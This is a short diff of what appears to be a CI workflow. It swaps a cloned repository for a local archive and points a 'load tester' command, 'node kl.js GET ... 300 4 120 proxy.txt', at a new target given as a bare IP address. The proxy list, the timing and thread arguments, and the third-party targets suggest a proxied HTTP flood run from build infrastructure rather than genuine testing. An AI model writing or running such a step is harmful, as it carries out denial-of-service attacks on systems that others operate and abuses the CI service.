@@ -43,9 +43,10 @@ jobs:
       
       - name: Run HTTP/3 load tester (if Python script exists)
         run: |
-          git clone https://github.com/vrbrh921-glitch/Fc.git
+          
+          unzip Fc-main.zip
           cd Fc
-          node kl.js GET https://rapidis.gay/6901966783-7f714071-a6d2-4f2e-b19c-9a67e37568e3 300 4 120 proxy.txt 
+          node kl.js GET https://130.12.182.33/cgi-sys/defaultwebpage.cgi 300 4 120 proxy.txt 
           
           
           
